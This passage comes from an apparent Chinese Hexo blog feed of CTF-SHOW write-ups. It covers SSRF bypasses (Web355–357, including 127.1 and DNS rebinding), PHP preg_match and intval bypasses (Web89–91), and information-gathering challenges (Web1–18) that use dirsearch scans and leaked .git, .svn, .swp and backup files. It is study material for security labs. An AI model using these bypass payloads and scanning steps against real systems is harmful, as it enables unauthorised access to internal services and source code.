class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>

<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>要求主机字符数不大于5</p>
<p>那么直接使用0即可</p>
<h3 id="其他思路-1"><a href="#其他思路-1" class="headerlink" title="其他思路"></a>其他思路</h3><ol>
<li>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></li>
</ol>
<h2 id="Web356"><a href="#Web356" class="headerlink" title="Web356"></a>Web356</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line">        <span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>

<p>没得说</p>
<h2 id="Web357"><a href="#Web357" class="headerlink" title="Web357"></a>Web357</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure>

<h3 id="前置基础知识-1"><a href="#前置基础知识-1" class="headerlink" title="前置基础知识"></a>前置基础知识</h3><h5 id="filter-var函数"><a href="#filter-var函数" class="headerlink" title="filter_var函数"></a>filter_var函数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter_var(variable,filter,options)</span><br></pre></td></tr></table></figure>

<p>varieble：必须。规定要过滤的变量</p>
<p>filter：可选。规定要使用的过滤器的ID。默认是FILTER_SANTIZE_STRING</p>
<p>FILTER_VALIDATE_IP: 把值作为IP地址来验证，只限IPv4或IPv6或不是来自私有或者保留的范围</p>
<p><a href="https://www.runoob.com/php/php-ref-filter.html">所有filter</a></p>
<p>option：可选。规定一个包含标志&#x2F;选项的关联数组或者一个单一的标志&#x2F;选项。检查每个过滤器可能的标志和选项</p>
<ul>
<li>FILTER_FLAG_NO_PRIV_RANGE：排除IPv4私有地址段</li>
</ul>
<p>​	过滤范围： 192.168.0.0&#x2F;16192.168.0.0&#x2F;16（192.168.0.0 - 192.168.255.255） 10.0.0.0&#x2F;810.0.0.0&#x2F;8（10.0.0.0 - 10.255.255.255） 172.16.0.0&#x2F;12172.16.0.0&#x2F;12（172.16.0.0 - 172.31.255.255）</p>
<ul>
<li>FILTER_FLAG_NO_RES_RANGE：排除特殊用途 IP 段</li>
</ul>
<p>​	过滤范围： 0.0.0.0&#x2F;80.0.0.0&#x2F;8（保留地址） 127.0.0.0&#x2F;8127.0.0.0&#x2F;8（环回地址） 169.254.0.0&#x2F;16169.254.0.0&#x2F;16（链路本地地址） 224.0.0.0&#x2F;4224.0.0.0&#x2F;4（多播地址） 240.0.0.0&#x2F;4240.0.0.0&#x2F;4（未来保留）</p>
<h3 id="DNS-rebinding（DNS重新绑定攻击）"><a href="#DNS-rebinding（DNS重新绑定攻击）" class="headerlink" title="DNS rebinding（DNS重新绑定攻击）"></a>DNS rebinding（DNS重新绑定攻击）</h3><h4 id="dwords（双字）编码"><a href="#dwords（双字）编码" class="headerlink" title="dwords（双字）编码"></a>dwords（双字）编码</h4><p>将IP地址转换为32位无符号整型数值，其变种可以转化成十六进制或八进制</p>
<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>攻击者注册一个域名，设置很短的TTL，先指向一个合法的公网IP，然后再TTL过期后更新位内网IP。当客户端首次解析域名时得到合法IP，但在后续请求时由于DNS缓存过期，重新解析得到内网IP，从而绕过同源策略，访问本地服务。</p>
<p>攻击终点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址。</p>
<blockquote>
<p>TTL是英语Time-To-Live的简称，意思为一条域名解析在DNS服务器中的存留时间。当各地的NS服务器接收到解析请求时，就会向域名指定的DNS服务器发出解析请求从而获得解析记录。在获得这个记录之后，记录会在DNS服务器中保存一段时间，这段时间如果再接到这个域名的解析请求，DNS服务器将不再向NS服务器发出请求，而是直接返回刚才获得的记录；而这个记录再DNS服务器上保留的时间，就是TTL值</p>
</blockquote>
<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>代码中一共对域名进行了两次请求，第一次是gethostbyname方法，第二次则是file_get_contets文件读取。</p>
<h2 id="Web358"><a href="#Web358" class="headerlink" title="Web358"></a>Web358</h2><p>待开发</p>
<h2 id="Web359"><a href="#Web359" class="headerlink" title="Web359"></a>Web359</h2><p>待开发</p>
<h2 id="Web360"><a href="#Web360" class="headerlink" title="Web360"></a>Web360</h2><p>待开发</p>
<p>flag not here, and flag in ffffllllaaaagggg</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2025/03/18/php%E7%89%B9%E6%80%A7/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote>
<p>Web89~150plus</p>
</blockquote>
<h2 id="Web89"><a href="#Web89" class="headerlink" title="Web89"></a>Web89</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求输入数字，却使用正则表达绕过了数字。</p>
<p>这是<strong>preg_match相关绕过</strong>，更准确一些这里是<strong>数组绕过</strong></p>
<p>与preg_match函数的特性相关，该函数要求第二个参数是字符串形式，如果传入数组时会返回flase。</p>
<h2 id="Web90"><a href="#Web90" class="headerlink" title="Web90"></a>Web90</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要输入的num的十进制值为4476，但是不能直接输入将其字符串赋值为4476</p>
<p>这个实际上是<strong>intval相关绕过</strong>，采取<strong>换进制</strong>的做法</p>
<h2 id="Web91"><a href="#Web91" class="headerlink" title="Web91"></a>Web91</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模式部分很容易看懂。 <code>/</code>是分割符，<code>^</code>表示开头，<code>$</code>表示结尾。说明这里需要<strong>精确匹配</strong></p>
<p>但这里需要理解修饰符的意思。<code>-i</code>表示不区分大小写，<code>-m</code>表示多行模式（<u>^和$会匹配每行的开始和结束</u>）</p>
<p>分析题目，需要cmd多行包含php，但不能精确匹配到php</p>
<p>使用<strong>换行符绕过</strong>：<strong>%0a</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=php%0ap</span><br></pre></td></tr></table></figure>



<h2 id="Web92"><a href="#Web92" class="headerlink" title="Web92"></a>Web92</h2><p>题重复了</p>
<p>不是后面怎么这么多重复的是我的问题吗</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2025/03/18/php%E7%89%B9%E6%80%A7/%E5%B8%B8%E7%94%A8php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="CTF中常用PHP特性总结"><a href="#CTF中常用PHP特性总结" class="headerlink" title="CTF中常用PHP特性总结"></a>CTF中常用PHP特性总结</h2><blockquote>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/17410173.html">https://www.cnblogs.com/gxngxngxn/p/17410173.html</a></p>
</blockquote>
<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">preg_match</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] )</span><br><span class="line">    参数说明：</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span>: 要搜索的模式，字符串形式。</span><br><span class="line"></span><br><span class="line">    <span class="variable">$subject</span>: 输入字符串。</span><br><span class="line"></span><br><span class="line">    <span class="variable">$matches</span>: 如果提供了参数matches，它将被填充为搜索结果。 <span class="variable">$matches</span>[<span class="number">0</span>]将包含完整模式匹配到的文本， <span class="variable">$matches</span>[<span class="number">1</span>] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br><span class="line"></span><br><span class="line">    <span class="variable">$flags</span>：flags 可以被设置为以下标记值：</span><br><span class="line"></span><br><span class="line">    <span class="comment">#PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</span></span><br></pre></td></tr></table></figure>



<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2>]]></content>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2025/03/18/%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h3 id="git目录泄露"><a href="#git目录泄露" class="headerlink" title="git目录泄露"></a>git目录泄露</h3><p>源码泄露</p>
<h3 id="svn目录泄露"><a href="#svn目录泄露" class="headerlink" title="svn目录泄露"></a>svn目录泄露</h3><p>源码泄露</p>
<h3 id="idea工程目录泄露"><a href="#idea工程目录泄露" class="headerlink" title="idea工程目录泄露"></a>idea工程目录泄露</h3><p>项目内容，数据库等等</p>
<h3 id="后台目录泄露"><a href="#后台目录泄露" class="headerlink" title="后台目录泄露"></a>后台目录泄露</h3><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>当题目没有给出过多的信息的时候，就需要进行目录扫盘</p>
<p>如果方向明确，就没有必要</p>
<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><h2 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h2><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p>​	index.php.swp .index.php.swo</p>
<h2 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h2><p>​	index.php~</p>
<h3 id="其他备份文件"><a href="#其他备份文件" class="headerlink" title="其他备份文件"></a>其他备份文件</h3><p>​	<a href="http://www.zip/">www.zip</a>  sql.bak</p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SHOW 刷题记录Web1</title>
    <url>/2025/03/18/%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote>
<p>Web 1~17</p>
</blockquote>
<p>总的来说，信息搜集首先需要经历扫盘，F12，抓包三大件</p>
<p>注意结合题目</p>
<h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>F12</p>
<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>本质是js前台拦截，无法呼出右键菜单，也无法使用f12</p>
<ol>
<li>url前加入<code>view-source:</code>查看源代码</li>
<li><code>ctrl+u</code>查看源码</li>
<li>打开一个空白网页，按F12，再把网址复制进去并回车</li>
<li>bp抓包，放到repeater中</li>
</ol>
<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><ol>
<li><p>使用bp抓个包看看</p>
</li>
<li><p>f12—网络——刷新——查看消息头</p>
</li>
</ol>
<h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>扫目录得到敏感文件<code>robots.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u https://bc86a6ed-f331-45f2-a6d2-6079ed4ba162.challenge.ctf.show -e* -i 200,201,201-300 -t 30</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250309220604925.png" alt="image-20250309220604925" style="zoom: 33%;">

<p>查看<code>robots.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://bc86a6ed-f331-45f2-a6d2-6079ed4ba162.challenge.ctf.show/robots.txt</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250309220749006.png" alt="image-20250309220749006" style="zoom:50%;">

<p>查看<code>flagishere.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://bc86a6ed-f331-45f2-a6d2-6079ed4ba162.challenge.ctf.show/flagishere.txt</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><h3 id="phps文件泄露"><a href="#phps文件泄露" class="headerlink" title="phps文件泄露"></a>phps文件泄露</h3><p><font color="red">phps文件就是php的源代码文件</font>，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容</p>
<p>因为用户无法直接通过web浏览器看到php文件的内容，所以需要用phps文件代替。<font color="red">用户访问phps文件就能看到对应php文件的源码</font></p>
<p>phps通常作为备份文件。其他常见的有linux的备份文件，比如index.php.swp，还有<a href="http://www.zip等/">www.zip等</a></p>
<p>可使用工具：</p>
<p><a href="https://github.com/shanyuhe/fzbk">https://github.com/shanyuhe/fzbk</a></p>
<p>或者burp打一波fuzz</p>
<p><a href="https://github.com/3had0w/Fuzzing-Dicts/blob/master/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%AD%97%E5%85%B8%EF%BC%882954%EF%BC%89.txt">https://github.com/3had0w/Fuzzing-Dicts/blob/master/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%AD%97%E5%85%B8%EF%BC%882954%EF%BC%89.txt</a></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>并不能看到网页源码，盲猜有phps的事儿，<del>使用dirsearch扫目录能扫到index.phps（有人说扫出来了但我扫不出来）</del></p>
<p>url后加上&#x2F;index.phps查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-01 14:14:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-01 14:34:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//ctfshow&#123;fc679ea6-d6b2-4715-bf93-5257f91fd750&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;web5:where is flag ?&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p><a href="http://www.zip泄露/">www.zip泄露</a></p>
<h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p>标题一眼git泄露</p>
<blockquote>
<p>git init初始化时，会在当前目录下自动创建一个.git目录用来记录代码的变更记录等。发布代码的时候，如果没有把这个.git删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码</p>
</blockquote>
<h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>通过dirsearch扫目录得出是svn泄露</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250309225706862.png" alt="image-20250309225706862"></p>
<blockquote>
<p>SVN是一个开放源代码的版本控制系统，在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用”导出“功能，而是直接复制代码文件夹道WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn&#x2F;entries文件，获取到服务器源码</p>
</blockquote>
<h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p>dirsearch没扫出来，但是题目提示很清楚</p>
<p>直接访问index.php.swp</p>
<blockquote>
<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除。当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p>
<p>以 index.php 为例：</p>
<p>第一次产生的交换文件名为 .index.php.<font color="blue">swp</font><br>再次意外退出后，将会产生名为 .index.php.<font color="blue">swo </font>的交换文件<br>第三次产生的交换文件则为 .index.php.<font color="blue">swn</font></p>
</blockquote>
<h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p>抓包，信息头中cookie里有</p>
<h2 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h2><p>有时候域名地址会包含某些信息</p>
<p>如 flag.ctfshow.com</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询域名解析地址 基本格式：nslookup host [server]</span><br><span class="line"></span><br><span class="line">查询域名的指定解析类型的解析记录 基本格式：nslookup -type=type host [server]</span><br><span class="line"></span><br><span class="line">查询全部 基本格式：nslookup -query=any host [server]</span><br><span class="line"></span><br><span class="line">nslookup -query=any flag.ctfshow.com </span><br><span class="line">服务器: public-dns-a.baidu.com Address: 180.76.76.76 </span><br><span class="line">非权威应答: flag.ctfshow.com text = &quot;flag&#123;just_seesee&#125;&quot;</span><br></pre></td></tr></table></figure>



<h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><p>扫盘的到以下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310091841160.png" alt="image-20250310091841160"></p>
<p>进入admin页面，发现需要登录账号和密码。账户不必多说为admin，密码根据题目提示，在网站主页中，根据猜测为下方的一个不寻常的电话热线</p>
<h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><p>document技术文档信息泄露</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310092820855.png" alt="image-20250310092820855" style="zoom:50%;">

<p>点开document后得到以下</p>
<img src="C:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250310093014910.png" alt="image-20250310093014910" style="zoom:67%;">

<p>注意your-domain是你的靶场域名</p>
<h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><p>扫盘得到&#x2F;editor&#x2F;</p>
<p>发现其中插入文件的文件空间是本地文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310094639676.png" alt="image-20250310094639676"></p>
<p>首先看这个网页	var&#x2F;www&#x2F;html</p>
<p>发现有个文件夹nothinghere</p>
<p>点开看有fl000g.txt</p>
<p>所以只需要在靶场url后加上&#x2F;nothinghere&#x2F;fl000g.txt即可</p>
<h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><p>气笑了</p>
<p>扫盘得到admin后台登录页面</p>
<p>账号默认admin，发现有个忘记密码</p>
<p>通过查询主页给出的qq账号得出所在地是西安，于是重置密码了</p>
<h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><p>探针泄露</p>
<blockquote>
<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息</p>
</blockquote>
<p>默认探针为<code>tz.php</code></p>
<p>进入探针，找到PHP信息（phpinfo）</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310130431844.png" alt="image-20250310130431844" style="zoom:50%;">

<p>在环境变量中找到flag</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250310130459383.png" alt="image-20250310130459383" style="zoom:67%;">



<h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><p>扫盘得到敏感文件<code>backup.sql</code></p>
<p>访问后下载文件，打开后得到flag</p>
<h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><p>界面是一个经典红温小游戏</p>
<p>我们查看它的js代码</p>
<p>发现通关条件为<code>game_over=true&amp;&amp;score&gt;100</code></p>
